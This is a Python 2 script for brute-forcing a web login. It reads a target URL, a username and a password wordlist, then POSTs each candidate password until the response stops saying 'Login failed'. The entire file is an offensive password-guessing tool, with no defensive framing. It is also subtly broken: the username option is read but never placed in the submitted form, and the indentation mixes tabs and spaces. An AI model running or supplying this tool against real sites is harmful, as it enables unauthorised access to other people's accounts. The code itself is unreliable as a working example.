#!/usr/bin/env python

import requests
import optparse
from colorama import Fore

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_url", help="Target url .")
    parser.add_option("-u", "--username", dest="username", help="Target Username.")
    parser.add_option("-p", "--password", dest="password", help="password wordlist .")
    (options, arguments) = parser.parse_args()
    if not options.target_url:
        parser.error("[-] Please Specify an Target URL, use --help for more info.")
    elif not options.username:
        parser.error("[-] Please Specify an Username, use --help for more info.")
    elif not options.password:
        parser.error("[-] Please Specify a Wordlist, use --help for more info.")
    return options

options = get_arguments()

target_url = str(options.target_url)
data_dic = {"username": "", "password": "", "Login": "submit"}
passlist = str(options.password)
username = options.username

with open(passlist,"r") as wordlist:
     for line in wordlist:
	  try:
	       word = line.strip()
	       data_dic["password"] = word
	       response = requests.post(target_url, data=data_dic)
	       if "Login failed" not in response.content:
		    print(Fore.GREEN+"[+] Password Found --> "+Fore.WHITE + word)
		    exit()
	  except requests.exceptions.ConnectionError:
	       user = raw_input("[!] Connection Error!")
	       exit()

print(Fore.RED+"[+] Password not Found!")
